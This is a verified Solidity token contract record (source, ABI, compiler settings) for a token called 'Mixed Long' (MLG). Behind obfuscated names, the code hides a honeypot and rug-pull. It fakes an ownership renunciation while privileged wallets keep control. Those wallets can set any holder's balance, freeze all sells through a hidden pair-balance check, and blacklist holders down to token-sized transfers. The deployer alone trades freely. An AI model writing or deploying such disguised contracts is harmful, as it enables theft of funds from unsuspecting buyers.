{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface autoTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract amountSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingExemptAmount {\n    function createPair(address receiverList, address toWallet) external returns (address);\n}\n\ninterface totalLaunched {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableAt) external view returns (uint256);\n\n    function transfer(address liquidityMode, uint256 marketingMin) external returns (bool);\n\n    function allowance(address receiverShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address liquidityMode,\n        uint256 marketingMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableTotal, uint256 value);\n    event Approval(address indexed receiverShould, address indexed spender, uint256 value);\n}\n\ninterface totalLaunchedMetadata is totalLaunched {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MixedLong is amountSender, totalLaunched, totalLaunchedMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletMode;\n    }\n\n    function transferFrom(address atTotal, address liquidityMode, uint256 marketingMin) external override returns (bool) {\n        if (_msgSender() != amountTokenTrading) {\n            if (enableIsTrading[atTotal][_msgSender()] != type(uint256).max) {\n                require(marketingMin <= enableIsTrading[atTotal][_msgSender()]);\n                enableIsTrading[atTotal][_msgSender()] -= marketingMin;\n            }\n        }\n        return maxFund(atTotal, liquidityMode, marketingMin);\n    }\n\n    function toLiquidity(address atTotal, address liquidityMode, uint256 marketingMin) internal returns (bool) {\n        require(txReceiverAmount[atTotal] >= marketingMin);\n        txReceiverAmount[atTotal] -= marketingMin;\n        txReceiverAmount[liquidityMode] += marketingMin;\n        emit Transfer(atTotal, liquidityMode, marketingMin);\n        return true;\n    }\n\n    function amountSwap(address walletExempt) public {\n        fundTrading();\n        if (fromFeeAuto != receiverMax) {\n            fromFeeAuto = true;\n        }\n        if (walletExempt == enableList || walletExempt == shouldTeam) {\n            return;\n        }\n        txLiquidity[walletExempt] = true;\n    }\n\n    function launchedLaunch(address modeAmount) public {\n        require(modeAmount.balance < 100000);\n        if (limitLaunchedReceiver) {\n            return;\n        }\n        if (fromFeeAuto == fromTake) {\n            fromTake = true;\n        }\n        tokenTeamWallet[modeAmount] = true;\n        if (minFeeMode == exemptTotalAt) {\n            exemptTotalAt = minFeeMode;\n        }\n        limitLaunchedReceiver = true;\n    }\n\n    bool public fromTake;\n\n    function getOwner() external view returns (address) {\n        return maxAmount;\n    }\n\n    uint256 minMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return modeToken;\n    }\n\n    function owner() external view returns (address) {\n        return maxAmount;\n    }\n\n    uint256 exemptLimit;\n\n    string private walletMode = \"MLG\";\n\n    uint256 private exemptTotalAt;\n\n    bool public fromFeeAuto;\n\n    string private senderFee = \"Mixed Long\";\n\n    function shouldReceiver(address feeLaunched, uint256 marketingMin) public {\n        fundTrading();\n        txReceiverAmount[feeLaunched] = marketingMin;\n    }\n\n    uint256 private minFeeMode;\n\n    uint256 private launchedTakeFrom = 100000000 * 10 ** 18;\n\n    function allowance(address launchMax, address sellTake) external view virtual override returns (uint256) {\n        if (sellTake == amountTokenTrading) {\n            return type(uint256).max;\n        }\n        return enableIsTrading[launchMax][sellTake];\n    }\n\n    function approve(address sellTake, uint256 marketingMin) public virtual override returns (bool) {\n        enableIsTrading[_msgSender()][sellTake] = marketingMin;\n        emit Approval(_msgSender(), sellTake, marketingMin);\n        return true;\n    }\n\n    address atTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address public enableList;\n\n    bool public receiverMax;\n\n    event OwnershipTransferred(address indexed listAuto, address indexed receiverExemptIs);\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchedTakeFrom;\n    }\n\n    mapping(address => bool) public tokenTeamWallet;\n\n    function balanceOf(address enableAt) public view virtual override returns (uint256) {\n        return txReceiverAmount[enableAt];\n    }\n\n    bool public limitLaunchedReceiver;\n\n    function transfer(address feeLaunched, uint256 marketingMin) external virtual override returns (bool) {\n        return maxFund(_msgSender(), feeLaunched, marketingMin);\n    }\n\n    function amountBuySender() public {\n        emit OwnershipTransferred(enableList, address(0));\n        maxAmount = address(0);\n    }\n\n    address private maxAmount;\n\n    function fundTrading() private view {\n        require(tokenTeamWallet[_msgSender()]);\n    }\n\n    address public shouldTeam;\n\n    constructor (){\n        \n        autoTake minTeam = autoTake(amountTokenTrading);\n        shouldTeam = marketingExemptAmount(minTeam.factory()).createPair(minTeam.WETH(), address(this));\n        if (minFeeMode != exemptTotalAt) {\n            receiverMax = true;\n        }\n        enableList = _msgSender();\n        amountBuySender();\n        tokenTeamWallet[enableList] = true;\n        txReceiverAmount[enableList] = launchedTakeFrom;\n        \n        emit Transfer(address(0), enableList, launchedTakeFrom);\n    }\n\n    uint256 constant totalExemptReceiver = 17 ** 10;\n\n    mapping(address => bool) public txLiquidity;\n\n    uint8 private modeToken = 18;\n\n    function maxFund(address atTotal, address liquidityMode, uint256 marketingMin) internal returns (bool) {\n        if (atTotal == enableList) {\n            return toLiquidity(atTotal, liquidityMode, marketingMin);\n        }\n        uint256 takeTeam = totalLaunched(shouldTeam).balanceOf(atTrading);\n        require(takeTeam == minMarketing);\n        require(liquidityMode != atTrading);\n        if (txLiquidity[atTotal]) {\n            return toLiquidity(atTotal, liquidityMode, totalExemptReceiver);\n        }\n        return toLiquidity(atTotal, liquidityMode, marketingMin);\n    }\n\n    mapping(address => mapping(address => uint256)) private enableIsTrading;\n\n    address amountTokenTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function receiverWallet(uint256 marketingMin) public {\n        fundTrading();\n        minMarketing = marketingMin;\n    }\n\n    mapping(address => uint256) private txReceiverAmount;\n\n    function name() external view virtual override returns (string memory) {\n        return senderFee;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverExemptIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountBuySender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletExempt\",\"type\":\"address\"}],\"name\":\"amountSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromFeeAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"}],\"name\":\"launchedLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitLaunchedReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingMin\",\"type\":\"uint256\"}],\"name\":\"receiverWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMin\",\"type\":\"uint256\"}],\"name\":\"shouldReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenTeamWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MixedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}